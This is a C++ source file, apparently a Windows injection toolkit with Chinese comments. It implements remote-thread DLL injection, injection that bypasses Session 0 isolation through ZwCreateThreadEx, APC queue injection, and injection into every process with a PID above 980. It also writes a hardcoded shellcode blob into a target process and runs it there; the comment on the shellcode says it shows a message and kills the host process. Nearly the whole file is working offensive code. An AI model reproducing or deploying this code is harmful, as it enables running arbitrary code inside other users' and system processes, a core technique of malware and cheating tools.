#include "stdafx.h"
#include <tchar.h>
#include "InjectCode.h"
#include <TlHelp32.h>

// 错误提示
void ShowError(const wchar_t* szBuf)
{
	::MessageBoxW(0, szBuf, L"错误提示", 0);
}
// 全局单一注入
void Inject(const wchar_t* dllPath, DWORD dwPid)
{
	//宽字节的长度要注意一点
	DWORD dwBufSize = (DWORD)(_tcslen(dllPath) + 1) * sizeof(wchar_t);
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	CString szPid = {};
	if (!hProcess) {
		szPid.Format(L"打开进程失败PID:%d 错误码%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//在被注入的进程中分配一块虚拟内存
	LPVOID lpAddr = VirtualAllocEx(hProcess,
		NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);
	if (!lpAddr) {		
		szPid.Format(L"PID:%d分配内存失败 错误码%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//把dll路径注入到目标进程中
	SIZE_T dwWrite = 0;
	WriteProcessMemory(hProcess, lpAddr,
		(LPCVOID)dllPath, dwBufSize, &dwWrite);
	if (dwBufSize != dwWrite)
	{		
		szPid.Format(L"PID:%d dll路径写入失败 错误码%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//创建远程线程
	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		LPTHREAD_START_ROUTINE(LoadLibraryW), lpAddr, 0, 0);
	if (!hThread)
	{		
		szPid.Format(L"PID:%d 创建远程线程失败 错误码%d\n", dwPid, GetLastError);
		OutputDebugString(szPid);
		return;
	}

	//等待线程结束
	//WaitForSingleObject(hThread, INFINITE);
	//VirtualFreeEx(hProcess, lpAddr, MAX_PATH, MEM_RESERVE);
	//CloseHandle(hThread);
	CloseHandle(hProcess);
}
// 全局单一卸载
void Enject(const wchar_t* dllPath, DWORD dwPid)
{
	MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
	//遍历每个进程的模块
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);
	if (INVALID_HANDLE_VALUE == hSnap)
		return;
	bool bOK = false;
	Module32First(hSnap, &me);
	do
	{
		if (!_tcsicmp(me.szModule, dllPath) ||
			!_tcsicmp(me.szExePath, dllPath))
		{
			bOK = true;
			break;
		}

	} while (Module32Next(hSnap, &me));

	if (!bOK) {
		CloseHandle(hSnap);
		return;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) {
		CloseHandle(hSnap);
		return;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)FreeLibrary, me.modBaseAddr, 0, 0);

	//WaitForSingleObject(hThread, INFINITE);
	//CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnap);
}



// 远程线程注入
BOOL RemoteInjectDll(DWORD dwPid, const char* DllPath)
{	
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{		
		ShowError(L"根据PID打开程序失败！");
		return FALSE;
	}

	//在注入的进程中分配一块虚拟内存
	LPVOID lpAddr = ::VirtualAllocEx(hProcess,
		NULL, MAX_PATH, MEM_COMMIT, PAGE_READWRITE);
	if (!lpAddr)
	{
		ShowError(L"分配虚拟内存失败！");
		::CloseHandle(hProcess);
		return FALSE;
	}

	//把dll路径写入到目标进程空间中
	SIZE_T dwWrite = 0;
	::WriteProcessMemory(hProcess, lpAddr, DllPath,
		strlen(DllPath) + 1, &dwWrite);
	if (strlen(DllPath) + 1 != dwWrite)
	{
		ShowError(L"DLL写入进程空间内失败！");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return FALSE;
	}

	//创建远程线程
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)LoadLibraryA, lpAddr, 0, 0);
	if (!hThread)
	{
		ShowError(L"创建远程线程失败！");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return FALSE;
	}

	//等待线程结束(无穷大毫秒)
	//::WaitForSingleObject(hThread, INFINITE);

	//释放
	//::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
	//::CloseHandle(hThread);
	::CloseHandle(hProcess);
	
	return TRUE;
}

// 突破SESSION0隔离的远程线程注入
void AcrossSession0(DWORD dwPid, const char* DllPath)
{
	HANDLE hProcess = NULL;
	SIZE_T dwSize = 0;
	LPVOID pDllAddr = NULL;
	FARPROC pFuncProcAddr = NULL;
	HANDLE hRemoteThread = NULL;
	DWORD dwStatus = 0;

	// 打开注入进程，获取进程句柄
	hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (NULL == hProcess)
	{
		ShowError(L"打开目标进程失败！");
		return;
	}
	// 在注入进程中申请内存
	dwSize = 1 + strlen(DllPath);
	pDllAddr = ::VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == pDllAddr)
	{
		ShowError(L"分配虚拟内存失败！");
		return;
	}
	// 向申请的内存中写入数据
	if (FALSE == ::WriteProcessMemory(hProcess, pDllAddr, DllPath, dwSize, NULL))
	{
		ShowError(L"向申请的内存中写入数据失败！");
		return;
	}
	// 加载 ntdll.dll
	HMODULE hNtdllDll = ::LoadLibraryA("ntdll.dll");
	if (NULL == hNtdllDll)
	{
		ShowError(L"加载ntdll.dll失败！");
		return;
	}

	// 获取ZwCreateThread函数地址
#ifdef _WIN64
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		ULONG CreateThreadFlags,
		SIZE_T ZeroBits,
		SIZE_T StackSize,
		SIZE_T MaximumStackSize,
		LPVOID pUnkown);
#else
	typedef DWORD(WINAPI *typedef_ZwCreateThreadEx)(
		PHANDLE ThreadHandle,
		ACCESS_MASK DesiredAccess,
		LPVOID ObjectAttributes,
		HANDLE ProcessHandle,
		LPTHREAD_START_ROUTINE lpStartAddress,
		LPVOID lpParameter,
		BOOL CreateSuspended,
		DWORD dwStackSize,
		DWORD dw1,
		DWORD dw2,
		LPVOID pUnkown);
#endif
	typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)::GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
	if (NULL == ZwCreateThreadEx)
	{
		ShowError(L"获取ZwCreateThreadEx函数地址失败！");
		return;
	}
	// 使用 ZwCreateThreadEx 创建远线程, 实现 DLL 注入
	dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)LoadLibraryA, pDllAddr, 0, 0, 0, 0, NULL);
	if (NULL == hRemoteThread)
	{
		ShowError(L"ZwCreateThreadEx创建远程线程失败！");
		return;
	}
	
	// 释放与关闭句柄
	::CloseHandle(hProcess);
	::FreeLibrary(hNtdllDll);		
		
}

// APC注入
void APCInject(DWORD dwPid, const char* DllPath)
{	
	
	DWORD* pTid = NULL;
	DWORD dwTidNum = 0;

	// 根据PID获取该进程所有TID   
	GetAllTidByPid(dwPid, &pTid, &dwTidNum);

	// 打开注入进程
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{
		ShowError(L"打开目标进程失败！");
		return;
	}

	SIZE_T siDllLength = 1 + ::strlen(DllPath);
	// 在该进程申请虚拟内存
	PVOID pBaseAddr = ::VirtualAllocEx(hProcess, NULL, siDllLength, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!pBaseAddr)
	{
		ShowError(L"分配虚拟内存失败！");
		CloseHandle(hProcess);
		delete[] pTid;
		return;
	}

	SIZE_T dwSize = 0;
	// 向申请的空间中写入DLL路径数据
	::WriteProcessMemory(hProcess, pBaseAddr, DllPath, siDllLength, &dwSize);

	HANDLE hThread = NULL;
	// 遍历线程，插入APC
	for (DWORD i = 0; i < dwTidNum; i++)
	{
		hThread = ::OpenThread(THREAD_ALL_ACCESS, FALSE, pTid[i]);
		if (hThread)
		{
			// 插入APC
			DWORD dwQue = ::QueueUserAPC((PAPCFUNC)LoadLibraryA, hThread, (ULONG_PTR)pBaseAddr);
			::CloseHandle(hThread);
			hThread = NULL;
		}
	}

	// 释放
	CloseHandle(hProcess);
	delete[] pTid;		
}

// 根据PID获取该进程所有TID   
BOOL GetAllTidByPid(DWORD dwPid, DWORD** ppTid, DWORD* pTidNum)
{
	DWORD* pTid = NULL;
	DWORD dwBufferLength = 1000;
	// 分配堆内存
	pTid = new DWORD[dwBufferLength];
	if (!pTid)
		return FALSE;
	::RtlZeroMemory(pTid, dwBufferLength * sizeof(DWORD));

	// 创建线程快照
	HANDLE hSnapshot = NULL;
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	if (!hSnapshot)
		return FALSE;

	DWORD dwThreadNum = 0;
	// 遍历线程快照
	if (::Thread32First(hSnapshot, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == dwPid)
			{
				pTid[dwThreadNum] = te32.th32ThreadID;
				++dwThreadNum;
			}
		} while (::Thread32Next(hSnapshot, &te32));
	}

	// 输出
	*ppTid = pTid;
	*pTidNum = dwThreadNum;

	return TRUE;
}

// 卸载DLL
BOOL UnloadDll(DWORD dwPid, LPCTSTR szDllName) 
{
	BOOL bMore = FALSE, bFound = FALSE;

	MODULEENTRY32 me = { sizeof(MODULEENTRY32) };
	HANDLE hSnapModule = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid);

	bMore = ::Module32First(hSnapModule, &me);
	while (bMore)
	{
		if (!_tcsicmp((LPCTSTR)me.szModule, szDllName) ||
			!_tcsicmp((LPCTSTR)me.szExePath, szDllName)) {
			bFound = TRUE;
			break;
		}
		bMore = ::Module32Next(hSnapModule, &me);
	}
	if (!bFound) 
	{
		ShowError(L"没有找到该模块!");
		CloseHandle(hSnapModule);
		return FALSE;
	}

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess) 
	{
		ShowError(L"打开目标进程失败!");		
		return FALSE;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)FreeLibrary, me.modBaseAddr, 0, 0);
	if (!hThread) 
	{
		ShowError(L"创建远程线程失败!");
		return FALSE;
	}

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	CloseHandle(hSnapModule);
	return TRUE;
}

// 全局注入
void GlobalInject(const wchar_t* DllPath, BOOL InjectOrUnLoad)
{
	//创建一个进程快照
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	PROCESSENTRY32 pe = { sizeof(PROCESSENTRY32) };
	pe.dwSize = sizeof(PROCESSENTRY32);
	DWORD dwPid = 0;
	DWORD dwCurrentPid = GetCurrentProcessId();
	//遍历进程
	if (TRUE == Process32First(hSnap, &pe))
	{
		do
		{			
			// ID小于1000基本都是系统进程
			if (pe.th32ProcessID > 980)
			{
				dwPid = pe.th32ProcessID;
				if (InjectOrUnLoad)
				{
					// 不注入自己这个进程内
					if (pe.th32ProcessID != dwCurrentPid)					
						Inject(DllPath, dwPid);
				}
				else
					Enject(DllPath, dwPid);
			}
		} while (Process32Next(hSnap, &pe));
	}
	CloseHandle(hSnap);
}


struct MyStruct
{

};

// 弹出九阳道人 并且关闭本进程的攻击代码
char ShellCode[] = \
"\x60\x83\xEC\x60\xEB\x2E\x6E\x74\x64\x6C\x6C\x2E\x64\x6C\x6C\x00\x4C\x6F\x61\x64" \
"\x4C\x69\x62\x72\x61\x72\x79\x45\x78\x41\x00\x75\x73\x65\x72\x33\x32\x2E\x64\x6C" \
"\x6C\x00\x5D\x4E\x33\x96\x53\x90\xBA\x4E\x00\x00\xD9\xEE\xD9\x74\x24\xF4\x5A\x64" \
"\x8B\x35\x30\x00\x00\x00\x8B\x76\x0C\x8B\x76\x1C\x8B\x36\x8B\x5E\x08\x68\x85\xDF" \
"\xAF\xBB\x53\xE8\xB1\x00\x00\x00\x8B\xC8\x51\x52\x8D\x52\xDC\x52\x53\xFF\xD1\x5A" \
"\x59\x52\x50\x53\xE8\x01\x00\x00\x00\x61\x55\x8B\xEC\x83\xEC\x0C\x8B\x55\x10\x33" \
"\xC9\x8D\x72\xEB\x51\x51\x56\xFF\x55\x0C\x68\x80\x0A\x38\x1E\x50\xE8\x7C\x00\x00" \
"\x00\x33\xC9\x8B\x55\x10\x8D\x5A\xF6\x51\x53\x53\x51\xFF\xD0\x8B\x55\x10\x8D\x5A" \
"\xD2\x33\xC9\x51\x51\x53\xFF\x55\x0C\x68\x6B\xC8\xEB\x09\x50\xE8\x55\x00\x00\x00" \
"\x33\xC9\x51\xFF\xD0\x8B\xE5\x5D\xC2\x10\x00\xC8\x00\x00\x00\x83\xEC\x04\x53\x51" \
"\x52\xC7\x45\xFC\x00\x00\x00\x00\x33\xC0\x33\xC9\x8B\x75\x08\x8A\x04\x0E\x84\xC0" \
"\x74\x16\x8B\x7D\xFC\xC1\xE7\x19\x8B\x55\xFC\xC1\xEA\x07\x0B\xFA\x03\xF8\x89\x7D" \
"\xFC\x41\xEB\xE3\x8B\x75\x0C\x3B\xFE\xB8\x01\x00\x00\x00\x74\x02\x33\xC0\x5A\x59" \
"\x5B\xC9\xC2\x08\x00\x55\x8B\xEC\x83\xEC\x0C\x52\x53\x8B\x55\x08\x8B\x72\x3C\x8D" \
"\x34\x32\x8B\x76\x78\x8D\x34\x32\x8B\x7E\x1C\x8D\x3C\x3A\x89\x7D\xFC\x8B\x7E\x20" \
"\x8D\x3C\x3A\x89\x7D\xF8\x8B\x7E\x24\x8D\x3C\x3A\x89\x7D\xF4\x33\xC9\xEB\x01\x41" \
"\x8B\x75\xF8\x8B\x34\x8E\x8D\x34\x32\xFF\x75\x0C\x56\xE8\x6D\xFF\xFF\xFF\x85\xC0" \
"\x74\xE9\x8B\x75\xF4\x33\xDB\x66\x8B\x1C\x4E\x8B\x75\xFC\x8B\x34\x9E\x8D\x04\x32" \
"\x5B\x5A\x8B\xE5\x5D\xC2\x08\x00";

// 代码注入
void InjectCode(DWORD dwPid)
{
	HANDLE hProcess = ::OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid);
	if (!hProcess)
	{
		ShowError(L"根据PID打开程序失败！");
		return;
	}

	//在注入的进程中分配一块虚拟内存	
	LPVOID lpAddr = ::VirtualAllocEx(hProcess,
		NULL, sizeof(ShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!lpAddr)
	{
		ShowError(L"分配虚拟内存失败！");
		::CloseHandle(hProcess);
		return;
	}

	//把dll路径写入到目标进程空间中
	SIZE_T dwWrite = 0;
	::WriteProcessMemory(hProcess, lpAddr, (LPCVOID)&ShellCode,
		sizeof(ShellCode), &dwWrite);
	if (sizeof(ShellCode) != dwWrite)
	{
		ShowError(L"DLL写入进程空间内失败！");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return;
	}

	//创建远程线程
	HANDLE hThread = ::CreateRemoteThread(hProcess, 0, 0,
		(LPTHREAD_START_ROUTINE)lpAddr, nullptr, 0, 0);
	if (!hThread)
	{
		ShowError(L"创建远程线程失败！");
		::VirtualFreeEx(hProcess, lpAddr, 0, MEM_RELEASE);
		::CloseHandle(hProcess);
		return;
	}			

	::CloseHandle(hThread);
	::CloseHandle(hProcess);
}
